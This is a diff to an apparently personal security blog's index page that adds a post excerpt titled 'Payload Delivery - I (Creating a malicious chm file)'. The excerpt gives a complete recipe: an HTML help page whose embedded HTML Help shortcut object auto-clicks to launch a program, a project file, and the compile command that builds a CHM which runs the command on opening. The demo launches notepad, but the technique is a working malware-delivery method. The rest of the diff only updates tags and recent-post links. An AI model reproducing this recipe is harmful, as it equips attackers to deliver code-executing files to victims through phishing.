@@ -137,6 +137,41 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2024/12/29/payload-delivery1/" >Payload Delivery - I (Creating a malicious chm file)</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2024-12-29  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="Payload-Delivery-using-CHM-file"><a href="#Payload-Delivery-using-CHM-file" class="headerlink" title="Payload Delivery using CHM file"></a>Payload Delivery using CHM file</h1><p>create the malicious html file <code>help.htm</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//IETF//DTD HTML//EN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">content</span>=<span class="string">&quot;text/html; charset=iso-8859-1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;GENERATOR&quot;</span> <span class="attr">content</span>=<span class="string">&quot;Microsoft HTML Help Workshop 4.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Monitoring help messages<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Monitoring help messages</span><br><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>You can view help messages to troubleshoot context-sensitive help. Help messages contain the text of each HTML Help API call that is made. Each time you activate context sensitive help in your application, a new message appears including parameters such as the topic ID, text file, and compiled help file that were referenced in the call. These messages can be saved as a text file.</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>What do you want to do?<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;,explorer.exe,C:\Windows\System32\notepad.exe&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;273,1,1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line">  x.Click();</span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Create the <code>help.hhp</code> file</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[OPTIONS]</span><br><span class="line">Compiled file=help.chm</span><br><span class="line"></span><br><span class="line">[FILES]</span><br><span class="line">help.htm</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Download the <a target="_blank" rel="noopener" href="https://web.archive.org/web/20160222072112if_/http://download.microsoft.com/download/0/A/9/0A939EF6-E31C-430F-A3DF-DFAE7960D564/htmlhelp.exe">Microsoft HTML Help Workshop and Documentation</a></p>
+<p>Put both the file in the same folder<br><img src="/2024/12/29/payload-delivery1/payloaddelivery1.png" alt="alt text"></p>
+<p>Now run from the directory containing the files <code>&quot;C:\Program Files (x86)\HTML Help Workshop\hhc.exe&quot; hello.hhp</code></p>
+<p><img src="/2024/12/29/payload-delivery1/payloaddelivery2.png" alt="alt text"></p>
+<p>Warning window is pop<br><img src="/2024/12/29/payload-delivery1/payloaddelivery3.png" alt="alt text"><br>onclicking <code>yes</code> we will see that our command got executed.<br><img src="/2024/12/29/payload-delivery1/payloaddelivery4.png" alt="alt text"></p>
+	
+	</div>
+  <a type="button" href="/2024/12/29/payload-delivery1/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2024/12/27/reversetuts1/" >Reversing - I (Unpacking UPX)</a>
 		</h3>
 		</div>
@@ -462,42 +497,48 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/pwn/">pwn<span>1</span></a></li>
-		
 			<li><a href="/tags/web101/">web101<span>1</span></a></li>
-		
-			<li><a href="/tags/router/">router<span>1</span></a></li>
-		
-			<li><a href="/tags/IoT/">IoT<span>2</span></a></li>
-		
-			<li><a href="/tags/ctf/">ctf<span>1</span></a></li>
-		
-			<li><a href="/tags/unpackme/">unpackme<span>1</span></a></li>
-		
-			<li><a href="/tags/WINDOWS/">WINDOWS<span>2</span></a></li>
-		
-			<li><a href="/tags/x86/">x86<span>1</span></a></li>
-		
-			<li><a href="/tags/reversing/">reversing<span>1</span></a></li>
-		
-			<li><a href="/tags/exploit/">exploit<span>1</span></a></li>
-		
-			<li><a href="/tags/PE/">PE<span>1</span></a></li>
-		
-			<li><a href="/tags/D-Link/">D-Link<span>1</span></a></li>
 		
 			<li><a href="/tags/stackoverflow/">stackoverflow<span>1</span></a></li>
 		
-			<li><a href="/tags/linux/">linux<span>1</span></a></li>
+			<li><a href="/tags/x86/">x86<span>1</span></a></li>
 		
-			<li><a href="/tags/Router/">Router<span>1</span></a></li>
+			<li><a href="/tags/unpackme/">unpackme<span>1</span></a></li>
 		
-			<li><a href="/tags/web-hacking/">web hacking<span>1</span></a></li>
+			<li><a href="/tags/chm/">chm<span>1</span></a></li>
+		
+			<li><a href="/tags/malware/">malware<span>1</span></a></li>
+		
+			<li><a href="/tags/ctf/">ctf<span>1</span></a></li>
+		
+			<li><a href="/tags/PE/">PE<span>1</span></a></li>
 		
 			<li><a href="/tags/Firmware/">Firmware<span>1</span></a></li>
 		
+			<li><a href="/tags/IoT/">IoT<span>2</span></a></li>
+		
+			<li><a href="/tags/router/">router<span>1</span></a></li>
+		
+			<li><a href="/tags/linux/">linux<span>1</span></a></li>
+		
+			<li><a href="/tags/payload-delivery/">payload-delivery<span>1</span></a></li>
+		
+			<li><a href="/tags/web-hacking/">web hacking<span>1</span></a></li>
+		
+			<li><a href="/tags/pwn/">pwn<span>1</span></a></li>
+		
+			<li><a href="/tags/reversing/">reversing<span>1</span></a></li>
+		
+			<li><a href="/tags/WINDOWS/">WINDOWS<span>3</span></a></li>
+		
 			<li><a href="/tags/web-application/">web application<span>1</span></a></li>
 		
+			<li><a href="/tags/D-Link/">D-Link<span>1</span></a></li>
+		
+			<li><a href="/tags/Router/">Router<span>1</span></a></li>
+		
+		
+		   <li><a href="/tags">...<span>21</span></a></li>
 		 
 		</ul>
 	</div>
@@ -508,6 +549,10 @@
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2024/12/29/payload-delivery1/" ><i class="fa fa-file-o"></i>Payload Delivery - I (Creat...</a>
+      </li>
     
       <li>
         <a href="/2024/12/27/reversetuts1/" ><i class="fa fa-file-o"></i>Reversing - I (Unpacking UPX)</a>
@@ -523,10 +568,6 @@
     
       <li>
         <a href="/2024/03/17/screenctf/" ><i class="fa fa-file-o"></i>CTF - LEVEL 101</a>
-      </li>
-    
-      <li>
-        <a href="/2024/03/16/format-string1/" ><i class="fa fa-file-o"></i>Format String - GOT Overwrite</a>
       </li>
     
   </ul>
